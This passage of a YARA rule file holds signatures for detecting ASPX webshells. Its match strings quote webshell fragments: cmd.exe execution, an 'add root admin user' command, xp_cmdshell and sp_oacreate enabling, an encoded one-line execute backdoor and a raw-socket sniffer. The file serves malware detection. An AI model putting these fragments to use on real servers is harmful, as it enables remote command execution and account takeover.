        $s3 = "Function xrunexploit(ByVal fpath As String, ByVal base64 As String, ByVal port As String, ByVal ip As String) As Boolean" fullword ascii
        $s4 = "Dim ir As System.Security.Principal.IdentityReference = ds.GetOwner(GetType(System.Security.Principal.NTAccount)" fullword ascii
        $s5 = "\"<td><span id=\"\"backC_\"\" class=\"\"msgcon\"\">example: (using netcat) run &quot;nc -l -p \" & bportC & \"&quot; and then p" fullword ascii
        $s6 = "headertop.InnerHtml = \"<a href=\"\"?\"\">\" & shell_title & \"</a>\"" fullword ascii
        $s7 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */
        $s8 = "xnewfolder.InnerHtml = \"<form method=\"\"get\"\" action=\"\"?\"\" style=\"\"display:inline;margin:0;padding:0;\"\">\" & _" fullword ascii
        $s9 = "xnewfile.InnerHtml = \"<form action=\"\"?\"\" method=\"\"get\"\" style=\"\"display:inline;margin:0;padding:0;\"\">\" & _" fullword ascii
        $s10 = "xnewconnect.InnerHtml = \"<form method=\"\"get\"\" action=\"\"?\"\" style=\"\"display:inline;margin:0;padding:0;\"\">\" & _" fullword ascii
        $s11 = "xnewchild.InnerHtml = \"<form method=\"\"get\"\" action=\"\"?\"\" style=\"\"display:inline;margin:0;padding:0;\"\">\" & _" fullword ascii
        $s12 = "Response.AddHeader(\"Content-Disposition\", \"attachment;filename=\" & fname & \"\")" fullword ascii
        $s13 = "\"<input style=\"\"width:300px;\"\" type=\"\"text\"\" name=\"\"childname\"\" value=\"\"\" & shell_name & \".aspx\"\"; />\" & _" fullword ascii
        $s14 = "Response.AddHeader(\"Content-transfer-encoding\", \"binary\")" fullword ascii
        $s15 = "<td style=\"width:88%;\"><input type=\"text\" id=\"cmd\" name=\"cmd\" value=\"\" style=\"width:100%;\" runat=\"server\" /></td>" fullword ascii
        $s16 = "\"<div style=\"\"font-size:10px;\"\">\" & shell_fake_name & \"</div>\" & _" fullword ascii
        $s17 = "Dim wBind As String = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" & _" fullword ascii
        $s18 = "html_head = \"<title>\" & html_title & \"</title>\" & shell_style" fullword ascii
        $s19 = "imglink = \"<p><a href=\"\"?img=\" & fname & \"\"\" target=\"\"_blank\"\"><span class=\"\"gaul\"\">[ </span>view full size<" fullword ascii
        $s20 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF" ascii /* base64 encoded string '                                                 ' */
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _898ebfa1757dcbbecb2afcdab1560d72ae6940de_9941bef59e9d17e337ac18f1b4cfc9a99dab445e_a9fb7e58fc2008830c8a785bf532288895dc79b7_3
{
    meta:
        description = "aspx - from files 898ebfa1757dcbbecb2afcdab1560d72ae6940de.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ba08d9125617307e4f8235f02cf1d5928374eea275456914e51d8a367657d10c"
        hash2 = "5bf7f8e8b37b9377b542916b690e7c700cc2035485a6c09cfefc682e951606d3"
        hash3 = "b51eca570abad9341a08ae4d153d2c64827db876ee0491eb941d7e9a48d43554"
    strings:
        $x1 = "Call oScript.Run (\"cmd.exe /c \" & cmd_to_execute & \" > \" & tempFile, 0, True)" fullword ascii
        $x2 = "errReturn = WinExec(Target_copy_of_cmd + \" /c \" + command + \"  > \" + tempFile , 10)" fullword ascii
        $x3 = "'local_copy_of_cmd= \"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\"" fullword ascii
        $x4 = "Sub ExecuteCommand1(command As String, tempFile As String,cmdfile As String)" fullword ascii
        $x5 = "Dim kProcessStartInfo As New ProcessStartInfo(\"cmd.exe\")" fullword ascii
        $x6 = "<p> Execute command with SQLServer account(<span class=\"style3\">Notice: only click \"Run\" to run</span>)</p>" fullword ascii
        $x7 = "Declare Function WinExec Lib \"kernel32\" Alias \"WinExec\" (ByVal lpCmdLine As String, ByVal nCmdShow As Long) As Long" fullword ascii
        $x8 = "Target_copy_of_cmd = Environment.GetEnvironmentVariable(\"Temp\")+\"\\kiss.exe\"" fullword ascii
        $x9 = "Function ExecuteCommand2(cmd_to_execute, tempFile)" fullword ascii
        $s10 = "ExecuteCommand1(command,tempFile,txtCmdFile.Text)" fullword ascii
        $s11 = "System.Web.Mail.SmtpMail.Send(request.ServerVariables(\"HTTP_HOST\"),\"test.mail.address.2008@gmail.com\",request.ServerVariable" ascii
        $s12 = "kProcessStartInfo.UseShellExecute = False" fullword ascii
        $s13 = "<asp:TextBox ID=\"txtCmdFile\" runat=\"server\" Width=\"473px\" style=\"border: 1px solid #084B8E\">C:\\\\WINDOWS\\\\system32" ascii
        $s14 = "Dim winObj, objProcessInfo, item, local_dir, local_copy_of_cmd, Target_copy_of_cmd" fullword ascii
        $s15 = "ExecuteCommand2(command,tempFile)" fullword ascii
        $s16 = "response.Write(\"<script>alert('Don\\'t exist \" & replace(temp,\"\\\",\"\\\\\")  &\" ! Is it a CD-ROM ?');</sc\" & \"ript>\")" fullword ascii
        $s17 = "Dim objStartup, objConfig, objProcess, errReturn, intProcessID, temp_name" fullword ascii
        $s18 = "recResult = adoConn.Execute(strQuery) " fullword ascii
        $s19 = "<p> Execute query with SQLServer account(<span class=\"style3\">Notice: only click \"Run\" to run</span>)</p>" fullword ascii
        $s20 = "adoConn.Open(\"Provider=SQLOLEDB.1;Password=\" & SqlPass.Text & \";UID=\" & SqlName.Text & \";Data Source = \" & ip.Text) " fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule _0378b9a95ed3af4943c6a58d87345dc944b881f7_0f8a4b1a9436476f570d004240efb2c9bbc19aa6_3db4b44135b638954a3d366902da23333ced3b87__4
{
    meta:
        description = "aspx - from files 0378b9a95ed3af4943c6a58d87345dc944b881f7.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a4ea5fc7d14f27bbf0697782e4a948cd50442164b1d84e7b23e6463da853a653"
        hash2 = "89cbea413c850aab5d67c4fa4798cdb9b62f56083e2f9362292a5e48423fee85"
        hash3 = "8d471c18d5306c15331e366d9595b6258fb51ea28ba13c288edb06c6a9c5a7f1"
        hash4 = "5c87ec9fbe71e3bdac867de4462c41cd28f1e50b31b1cd7e4fc6371a12f90db4"
        hash5 = "6f05055413ed95f501da9b6282cfc012d6201853b620a59d250edeac66474c16"
        hash6 = "15eed42e4904205b2ef2ff285ff1ce6c8138296c12cf075a2562c69a5fafd1cb"
        hash7 = "c3a539c800defe4c8e7147a3d36f436cd3c49c455c45de0431cc9ab65a2fe493"
        hash8 = "9c9e6feece7f19a1c7151a5778c3b20df83170a63402199b15eddd8a57c85297"
        hash9 = "2b7cce5da1fa31a0a688aa3c34b4c2ba33768596354ddeca3f9edaf5e4634da7"
        hash10 = "0b98620cb8ac21af5712f4e88ed6f42791eb35f48d2ed56b86b32ced845c68d1"
        hash11 = "1286a0815c6982fadf3a1da2565fedfd133b8d07a5de1d592a640c3abbc2ffa5"
        hash12 = "a350ca8e276a0d6f788ecea1b826e089a63df84b53ba92c9f13e701c70d6781e"
        hash13 = "2152f5aae39aebabd342ec252b2ec0fec2913b605b21c3983c016a3b83949b7f"
        hash14 = "c5d0c5851f404a27a261f098d69a86807b93e255879d736ba0fb2c96250661e6"
        hash15 = "46942a63d4d7113cca44fd86155915de0edaa1732177f878987e5893801e2daf"
        hash16 = "ebb106f401b34fe0656403d3d8c6cd836d1ac9680c60fdd8b60380c6a3bc0602"
        hash17 = "6e5b606bb919b0c9cdf98383aaa5e4d606db87e254251dc3ca7498b918900969"
    strings:
        $x1 = "Response.AddHeader(\"Content-Disposition\",\"attachment;filename=\"+HttpUtility.UrlEncode(fs.Name,System.Text.Encoding.UTF8));" fullword ascii
        $x2 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:\\\\\\r\\n-" ascii
        $x3 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:\\\\\\r\\n-" ascii
        $x4 = "td.Text=\"<a href=\\\"javascript:Bin_PostBack('urJG','\"+dt.Rows[j][\"ProcessID\"].ToString()+\"')\\\">Kill</a>\";" fullword ascii
        $s5 = "vyX.Text+=\"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\"+MVVJ(rootkey)+\"')\\\">\"+rootkey+\"</a> | \";" fullword ascii
        $s6 = "tc.Text=\"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\"+MVVJ(Reg_Path+innerSubKey)+\"')\\\">\"+innerSubKey+\"</a>\";" fullword ascii
        $s7 = "[DllImport(\"kernel32.dll\",EntryPoint=\"GetDriveTypeA\")]" fullword ascii
        $s8 = "foreach(ManagementObject p in PhQTd(\"Select * from Win32_Process Where ProcessID ='\"+pid+\"'\"))" fullword ascii
        $s9 = "tc.Text=\"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\"+MVVJ(rootkey)+\"')\\\">\"+rootkey+\"</a>\";" fullword ascii
        $s10 = "ServiceController[] kQmRu=System.ServiceProcess.ServiceController.GetServices();" fullword ascii
        $s11 = "nxeDR.Command+=new CommandEventHandler(this.iVk);" fullword ascii
        $s12 = "tc.Text=\"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\"+MVVJ(cJG)+\"')\\\">Parent Key</a>\";" fullword ascii
        $s13 = "string txc=@\"HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG\";" fullword ascii
        $s14 = "Bin_Td_Res.InnerHtml+=\"<font color=\\\"green\\\"><b>Exec Cmd.................\\r\\n</b></font>\";" fullword ascii
        $s15 = "string sutI=\"-SETDOMAIN\\r\\n-Domain=BIN|0.0.0.0|52521|-1|1|0\\r\\n-TZOEnable=0\\r\\n TZOKey=\\r\\n\";" fullword ascii
        $s16 = "Response.Cookies.Add(new HttpCookie(vbhLn,Password));" fullword ascii
        $s17 = "yEwc.Append(\"<li><u>Server Time : </u>\"+System.DateTime.Now.ToString()+\"</li>\");" fullword ascii
        $s18 = "Kkvb.ExecuteNonQuery();" fullword ascii
        $s19 = "zKvOw=Dtdr.GetOleDbSchemaTable(OleDbSchemaGuid.Tables,new Object[] { null,null,null,\"SYSTEM TABLE\" });" fullword ascii
        $s20 = "ahAE.StartInfo.UseShellExecute=false;" fullword ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef or uint16(0) == 0x3c76 ) and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _355c35e602e694b99b7094916b7e6d8dd664e931_5af49624cc19a4cd70989287c7d3d3edec0714c5_fd29a80dc9fa82a939f7c3f5638114de5e8361cf_5
{
    meta:
        description = "aspx - from files 355c35e602e694b99b7094916b7e6d8dd664e931.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "67db101a6c6b1b1bf58183ca513025048dc719ae4cbdba408092f0df296f9a67"
        hash2 = "b3303b610b955dfc13d3f554a042661f7249e83a78888377192d0eec6c2e925e"
        hash3 = "80513c8872794816db8f64f796db5f42bf2df7f287141aea2de0c64e22ebd01a"
    strings:
        $x1 = "File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.System)" fullword ascii
        $s2 = "response.Write(\"<script>alert('File info have add the cutboard, go to target directory click plaste!')</sc\"&\"ript>\")" fullword ascii
        $s3 = "myProcessStartInfo.UseShellExecute = False" fullword ascii
        $s4 = "db_cmd.ExecuteNonQuery()" fullword ascii
        $s5 = "File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.ReadOnly)" fullword ascii
        $s6 = "response.addHeader(\"Content-Disposition\", \"attachment; filename=\" & replace(server.UrlEncode(path.getfilename(thePath" fullword ascii
        $s7 = "rk = Registry.Users.OpenSubKey( Right(hu , Len(hu) - Instr( hu,\"\\\" )) , 0 )" fullword ascii
        $s8 = "myProcessStartInfo.Arguments = CMDCommand.text" fullword ascii
        $s9 = "<asp:HyperLink id=\"HyperLink1\" runat=\"server\" Visible=\"True\" Target=\"_blank\" NavigateUrl=\"http://canglangjidi.qyun.n" fullword ascii
        $s10 = "recResult = adoConn.Execute(strQuery)" fullword ascii
        $s11 = "<asp:Label id=\"DB_exe\" runat=\"server\" height=\"37px\" visible=\"False\">Execute SQL :</asp:Label>" fullword ascii
        $s12 = "<asp:TextBox class=\"TextBox\" id=\"CMDPath\" runat=\"server\" Wrap=\"False\" Text=\"cmd.exe\" Width=\"250px\">c:\\windows\\syst" ascii
        $s13 = "<asp:TextBox class=\"TextBox\" id=\"CMDPath\" runat=\"server\" Wrap=\"False\" Text=\"cmd.exe\" Width=\"250px\">c:\\windows\\syst" ascii
        $s14 = "File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.Archive)" fullword ascii
        $s15 = "File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.Hidden)" fullword ascii
        $s16 = "DataCStr.Text = \"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\\MyWeb\\UpdateWebadmin\\guestbook.mdb\"" fullword ascii
        $s17 = "File.SetAttributes(path, File.GetAttributes(path) Or FileAttributes.System)" fullword ascii
        $s18 = "directory.createdirectory(temp & Path.GetFileName(mid(tmp, 1, len(tmp)-1)))" fullword ascii
        $s19 = "32\\cmd.exe</asp:TextBox>" fullword ascii
        $s20 = "rk = Registry.CurrentConfig.OpenSubKey( Right(hu , Len(hu) - Instr( hu,\"\\\" )) , 0 )" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _3b34a5e22973f7ffc558896025fbd056b9275bf5_4efd010c6692111d4a5cc9eb0dd3dfedde907654_69472817d60a836fa2f055c2c73acc2da17daf8b__6
{
    meta:
        description = "aspx - from files 3b34a5e22973f7ffc558896025fbd056b9275bf5.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e522eebba2a083d07e1862bb8242dde6dedff8964ef8d4c0e3d9779c7841e929"
        hash2 = "f09b8567e0aa79ab9b223019b3f67cf98fe7dd2ffcab881e1421adf6f9e4c5b0"
        hash3 = "51d564b700c985fd7aba31ed6a0b8f7b7ddaa7a2adcdaf8d649adb2641ade061"
        hash4 = "d4fb7efb46331d500e4c70bc905209e7734d753e139ce83f4c9a481bd26ca6a7"
        hash5 = "fca2eae39f4009790408335b71d773b02890a08b581c6ff6bb32def585020abf"
        hash6 = "b65b55f0dac5b1f20d1f1260f3f98bae607a37447c435391b18c1977c8eca2ee"
    strings:
        $x1 = "string newdomain = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:" ascii
        $x2 = "CmdPath : &nbsp;<asp:TextBox ID=\"Bin_CmdPathTextBox\" runat=\"server\" Width=\"395px\">C:\\Windows\\System32\\Cmd.ex" fullword ascii
        $s3 = "string newdomain = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:" ascii
        $s4 = "iisinfo += \"<TD><a href=javascript:Command('change','\" + formatpath(newdir1.Properties[\"Path\"].Value.ToStrin" fullword ascii
        $s5 = "Bin_Filelist += \"<i><b><a href=javascript:Command('change','\" + parstr + \"');>|Parent Directory|</a></b></i>\";" fullword ascii
        $s6 = "tmpstr += \"<td><a href=javascript:Command('change','\" + foldername + \"')>\" + Bin_folder.Name + \"</a></td><td><b>" fullword ascii
        $s7 = "file += \"<a href=javascript:Command('change','\" + formatpath(drivers[i]) + \"');>\" + drivers[i] + \"</a>&nbsp;\";" fullword ascii
        $s8 = "and('showatt','\" + filename + \"');>Att</a>|<a href=javascript:Command('del','\" + filename + \"');>Del</a></td>\";" fullword ascii
        $s9 = "<asp:Button ID=\"Bin_LogshellButton\" runat=\"server\" Text=\"Bak_LOG\" OnClick=\"Bin_LogshellButton_Click\" /><hr /></a" fullword ascii
        $s10 = "Bin_SQLconnTextBox.Text = @\"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\\wwwroot\\database.mdb\";" fullword ascii
        $s11 = "InfoLabel.Text += Bin_Process() + \"<hr>\";" fullword ascii
        $s12 = "Response.AddHeader(\"Content-Disposition\", \"attachment;filename=\" + instr);" fullword ascii
        $s13 = "string htmlstr = \"<center><b><U>PROCESS-INFO</U></B></center><TABLE width=80% align=center border=0><TR align=center><TD" fullword ascii
        $s14 = "<asp:RadioButton ID=\"Bin_AccRadioButton\" runat=\"server\" AutoPostBack=\"True\" OnCheckedChanged=\"Bin_AccRadioButton_Che" fullword ascii
        $s15 = "<asp:RadioButton ID=\"Bin_SQLRadioButton\" runat=\"server\" AutoPostBack=\"True\" OnCheckedChanged=\"Bin_SQLRadioButton_Che" fullword ascii
        $s16 = "tmpstr += \"<td>\" + Bin_file.Name + \"</td><td>\" + Bin_file.Length + \"</td><td>\" + Directory.GetLastWriteTime(Bin_" fullword ascii
        $s17 = "width=20%><B>ID</B></TD><TD align=left width=20%><B>Process</B></TD><TD align=left width=20%><B>MemorySize</B></TD><TD align=ce" fullword ascii
        $s18 = "_OACreate','odsole70.dll')\\\">Add sp_oacreate<option value=\\\"Use master dbcc addextendedproc ('xp_cmdshell','xplog70.dll')" ascii
        $s19 = "Cmdpro.StartInfo.UseShellExecute = false;" fullword ascii
        $s20 = "File.SetAttributes(FileName, File.GetAttributes(FileName) | FileAttributes.System);" fullword ascii
    condition:
        ( ( uint16(0) == 0xbbef or uint16(0) == 0x253c ) and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _0e8b291e8acfae0f23ad5cbd6f08546a14ba6086_41fbd2f965a3c48011f9a2b6c629278c48286ab3_a34ca74451e192d9ec53ba2e4ac04a01ee73aba6__7
{
    meta:
        description = "aspx - from files 0e8b291e8acfae0f23ad5cbd6f08546a14ba6086.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "46a73ee18a69b984a6f9a67727fcf6533460f01e7f096bde3a98ff97ae119182"
        hash2 = "c6da86380a656233b12552ce321026d4d481fc531cc8b44dee7a6b395cecfd9b"
        hash3 = "d175b3176f1fb891735a2aaed2bc851074b3b50d4eb99c90146dc6a0eaa26d48"
        hash4 = "a6ac9698bd3a8081d9ace0088e1e96502c9da5f18650af8c882dda6e18ae4b31"
        hash5 = "e0761cc8a8ab19665f13275ee1ae52e113438738fe376915a471b23388b7dc0b"
        hash6 = "bbee3a7eeceef058919740e7317cd8f552b194badf3cdc6922e42b115fdd7fa9"
        hash7 = "80c56db3cc4d03dcc1e0d512d5b212ded84110a3a98381efe625689a6675ca1d"
    strings:
        $x1 = "ProcessStartInfo MyProcessStartInfo = new ProcessStartInfo(\"cmd.exe\");" fullword ascii
        $x2 = "Response.AddHeader(\"Content-Disposition\", \"attachment; filename=\" + HttpUtility.UrlEncode(file.Name));" fullword ascii
        $s3 = "MyProcessStartInfo.UseShellExecute = false;" fullword ascii
        $s4 = "<asp:Label ID=\"LbSqlD\" runat=\"server\" Text=\"Command:\" Width=\"42px\"></asp:Label>" fullword ascii
        $s5 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\" fullword ascii
        $s6 = "MyProcessStartInfo.Arguments = \"/c\" + TextBoxDos.Text;" fullword ascii
        $s7 = "Response.Write(\"<a href='?page=index&src=\" + Server.MapPath(\".\") + \"\\\\'><font color='#009900'>Webshell" fullword ascii
        $s8 = "<asp:Label ID=\"LbSqlA\" runat=\"server\" Text=\"Sql Host:\"></asp:Label>" fullword ascii
        $s9 = "ListBoxPro.Items.Add(allprocess.ProcessName);" fullword ascii
        $s10 = "Response.Redirect(webname + \"?page=index&src=\"+GetParentDir(src));////" fullword ascii
        $s11 = "LbNum.Text = ProcessNum + \"" fullword ascii
        $s12 = "Process[] process = Process.GetProcesses();" fullword ascii
        $s13 = "Process[] killprocess = Process.GetProcesses();" fullword ascii
        $s14 = "else if ((page == \"process\") && Session[\"root\"] != null)" fullword ascii
        $s15 = "<asp:Label ID=\"LbSqlB\" runat=\"server\" Text=\"Sql UserName:\"></asp:Label>" fullword ascii
        $s16 = "MyProcessStartInfo.RedirectStandardOutput = true;" fullword ascii
        $s17 = "Response.Redirect(GetParentDir(webname + \"?page=index&src=\" + src));" fullword ascii
        $s18 = "string time = File.GetCreationTime(file_name + \"\\\\\" + filed.Name.ToString()).ToString();" fullword ascii
        $s19 = "Response.Redirect(Request.Url+\"?page=index&src=\"+ Server.MapPath(\".\")+\"\\\\\");" fullword ascii
        $s20 = "Response.AddHeader(\"Content-Length\", file.Length.ToString());" fullword ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0x6967 ) and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _1206c22de8d51055a5e3841b4542fb13aa0f97dd_60d131af1ed23810dbc78f85ee32ffd863f8f0f4_c3bc4ab8076ef184c526eb7f16e08d41b4cec97e__8
{
    meta:
        description = "aspx - from files 1206c22de8d51055a5e3841b4542fb13aa0f97dd.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "655b22ac293b2717617da3c9e1a87c6f22a556c788adced2a2f97610f079d970"
        hash2 = "d9cd2bcd2a5449836a5c6b4f8e6e486f2f391f92e8db7fad044ab7d16438f4a2"
        hash3 = "ac297be1bc6d2147d5220775da20bd422f8453abb3e288eea12f40a62e4f3343"
        hash4 = "883986581a7f0a3dd4b2af35aa880957e9dee92019fc7e3a046328a99682ed56"
    strings:
        $s1 = "this.Lb_msg.Text = System.DateTime.Now.ToString()+\"  State: <b>\" + th.ThreadState.ToString() +\"</b>  Packets: \"+pack" fullword ascii
        $s2 = "this.Lb_msg.Text = System.DateTime.Now.ToString() + \"  State: <b>stoping. Click \\\"Refresh\\\" again to see if thread i" fullword ascii
        $s3 = "logfile = Server.MapPath(\"w\" + System.DateTime.Now.ToFileTime() + \".txt\");" fullword ascii
        $s4 = "if (stoptime.Year == (System.DateTime.Now.Year - 8))" fullword ascii
        $s5 = "if (this.txtlogfile.Text == \"\" || txtpackets.Text.Length < 1 || txtport.Text == \"\") return;" fullword ascii
        $s6 = "proException += \"<br>last time stop at \" + System.DateTime.Now.ToString();" fullword ascii
        $s7 = "System.DateTime nextDay = System.DateTime.Now.AddDays(1);" fullword ascii
        $s8 = "if (!logIt && my_s_smtp && (dport == 25 || sport == 25))" fullword ascii
        $s9 = "mainSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);" fullword ascii
        $s10 = "IPHostEntry HosyEntry = Dns.GetHostEntry((Dns.GetHostName()));" fullword ascii
        $s11 = "static DateTime stoptime = System.DateTime.Now.AddYears(-8);" fullword ascii
        $s12 = "if (!logIt && my_s_http_post)" fullword ascii
        $s13 = "mainSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);" fullword ascii
        $s14 = "mainSocket.Bind(new IPEndPoint(IPAddress.Parse(strIP), 0));" fullword ascii
        $s15 = "if (!logIt && datas.IndexOf(\"POST \")>=0)" fullword ascii
        $s16 = "this.txtlogfile.Text = logfile;" fullword ascii
        $s17 = "this.Lb_msg.Text = \"\\r\\nSniffing.Click \\\"Refresh\\\" to see the lastest status.\";" fullword ascii
        $s18 = "//stoptime = System.DateTime.Now;" fullword ascii
        $s19 = "this.txtkeywords.Text = keyword;" fullword ascii
        $s20 = "this.txtport.Text = port.ToString();" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 60KB and ( 8 of them ) ) or ( all of them )
}

rule _3b34a5e22973f7ffc558896025fbd056b9275bf5_4efd010c6692111d4a5cc9eb0dd3dfedde907654_69472817d60a836fa2f055c2c73acc2da17daf8b__9
{
    meta:
        description = "aspx - from files 3b34a5e22973f7ffc558896025fbd056b9275bf5.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e522eebba2a083d07e1862bb8242dde6dedff8964ef8d4c0e3d9779c7841e929"
        hash2 = "f09b8567e0aa79ab9b223019b3f67cf98fe7dd2ffcab881e1421adf6f9e4c5b0"
        hash3 = "51d564b700c985fd7aba31ed6a0b8f7b7ddaa7a2adcdaf8d649adb2641ade061"
        hash4 = "6a168885faf8f214d59547e2a049b65d603b9d2e2ebf00f561a3d0faa0977261"
        hash5 = "d4fb7efb46331d500e4c70bc905209e7734d753e139ce83f4c9a481bd26ca6a7"
        hash6 = "fca2eae39f4009790408335b71d773b02890a08b581c6ff6bb32def585020abf"
        hash7 = "b65b55f0dac5b1f20d1f1260f3f98bae607a37447c435391b18c1977c8eca2ee"
    strings:
        $x1 = "<asp:TextBox ID=\"Bin_SucmdTextBox\" runat=\"server\" Width=\"447px\">cmd.exe /c net user</asp:TextBox><br />" fullword ascii
        $s2 = "<asp:Button ID=\"Bin_SAexecButton\" runat=\"server\" Text=\"SA_Exec\" OnClick=\"Bin_SAexecButton_Click\" /><br />" fullword ascii
        $s3 = "<asp:Button ID=\"Bin_SACMDButton\" runat=\"server\" Text=\"SA_Exec\" OnClick=\"Bin_SACMDButton_Click\" />" fullword ascii
        $s4 = "<asp:Button ID=\"Bin_ExecButton\" runat=\"server\" OnClick=\"Bin_ExecButton_Click\" Text=\"Exec\" />" fullword ascii
        $s5 = "CmdPath : &nbsp;<asp:TextBox ID=\"Bin_CmdPathTextBox\" runat=\"server\" Width=\"395px\">C:\\Windows\\System32\\Cmd.exe</asp:Text" ascii
        $s6 = "<asp:Label ID=\"PassLabel\" runat=\"server\" Text=\"Password:\"></asp:Label>" fullword ascii
        $s7 = "<asp:TextBox ID=\"Bin_PortsTextBox\" runat=\"server\" Width=\"356px\">21,80,1433,3306,3389,4899,5631,43958,65500</asp:TextBox>" fullword ascii
        $s8 = "<asp:Button ID=\"Bin_PortButton\" runat=\"server\" Text=\"PortScan\" OnClick=\"Bin_PortButton_Click\" />" fullword ascii
        $s9 = "<asp:Button ID=\"Bin_IISButton\" runat=\"server\" OnClick=\"Bin_IISButton_Click\" Text=\"IISSpy\" />" fullword ascii
        $s10 = "<asp:Button ID=\"Bin_CmdButton\" runat=\"server\" Text=\"Command\" OnClick=\"Bin_CmdButton_Click\" />" fullword ascii
        $s11 = "<asp:Button ID=\"Bin_SuexpButton\" runat=\"server\" Text=\"Exploit\" OnClick=\"Bin_SuexpButton_Click\" /><br />" fullword ascii
        $s12 = "<asp:TextBox ID=\"passtext\" runat=\"server\" TextMode=\"Password\" Width=\"203px\"></asp:TextBox>" fullword ascii
        $s13 = "<asp:TextBox ID=\"Bin_ScanipTextBox\" runat=\"server\" Width=\"194px\">127.0.0.1</asp:TextBox>" fullword ascii
        $s14 = "<asp:TextBox ID=\"Bin_DirTextBox\" runat=\"server\" Width=\"447px\">c:\\</asp:TextBox>" fullword ascii
        $s15 = "3C256578656375746520726571756573742822422229253E" ascii /* hex encoded string '<%execute request("B")%>' */
        $s16 = "protected void Bin_ExecButton_Click(object sender, EventArgs e)" fullword ascii
        $s17 = "<asp:Label ID=\"Bin_CopytoLable\" runat=\"server\" Text=\"To:\"></asp:Label>" fullword ascii
        $s18 = "<asp:Button ID=\"LogoutButton\" runat=\"server\" OnClick=\"LogoutButton_Click\" Text=\"Logout\" /><br />" fullword ascii
        $s19 = "<asp:Button ID=\"Bin_ScancmdButton\" runat=\"server\" Text=\"Scan\" OnClick=\"Bin_ScancmdButton_Click\" /><br />" fullword ascii
        $s20 = "<asp:Label ID=\"Bin_DBinfoLabel\" runat=\"server\" Text=\"Label\" EnableViewState=\"False\"></asp:Label></div></asp:Panel>" fullword ascii
    condition:
        ( ( uint16(0) == 0xbbef or uint16(0) == 0x253c ) and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _019eb61a6b5046502808fb5ab2925be65c0539b4_a91320483df0178eb3cafea830c1bd94585fc896_b33086d2702fe6266783cd92638408d012966f31__10
{
    meta:
        description = "aspx - from files 019eb61a6b5046502808fb5ab2925be65c0539b4.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0ea1ec937dd7ada5c804f3448eb6d725ded32da469fc4847e23ba2e738411bf4"
        hash2 = "b96628b36911fce4ffa18cc10ba36d1dbd260f638c18b60e73f484c09ef0be09"
        hash3 = "a7da83250466100782ccb95ef8e2b4c5832df8811e99b8e332594a869391dfa6"
        hash4 = "d8f79f3f185fe10f8598b5d88fd55219d809856150fd693347b32d7df6ad6999"
    strings:
        $x1 = "ias.mdb','select shell(&#34;cmd.exe /c net user root root/add &#34;)')\">SandBox</asp:ListItem><asp:ListItem Value=\"create tabl" ascii
        $x2 = "\"http://www.rootkit.net.cn\" target=\"_blank\">Bin'Blog</a> All Rights Reserved.</div></div>" fullword ascii
        $s3 = "Create','odsole70.dll')\">Add sp_oacreate</asp:ListItem><asp:ListItem Value=\"Exec sp_configure 'show advanced options',1;RECONF" ascii
